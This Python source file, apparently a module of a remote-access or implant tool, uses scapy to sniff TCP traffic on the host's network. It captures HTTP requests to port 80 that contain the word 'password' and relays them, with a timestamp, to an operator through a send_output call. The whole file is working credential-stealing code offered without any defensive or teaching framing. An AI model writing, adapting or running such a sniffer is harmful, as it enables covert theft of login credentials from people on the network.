from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import re
from base64 import b64decode
from threading import Thread
from time import sleep
from random import randint
import time
 



import utils



def packet_callback(packet):
        global BUFFER
        pkt = str(packet[TCP].payload)
        if packet[IP].dport == 80:
			if str(bytes(packet[TCP].payload)) == "":
			   pass
			else:
				if "password" in  str(bytes(packet[TCP].payload)):
						 sleep(2)
						 now = time.strftime("%c")
						 utils.send_output("{{getrequestauth}}" + str(bytes(packet[TCP].payload)) + "{{{" + str(time.strftime("%c")))


						
def start_sniffer():				
	sniff(filter="tcp", prn=packet_callback, store=0)
	
def run():
	thread0 = Thread(target = start_sniffer)	
	thread0.start()
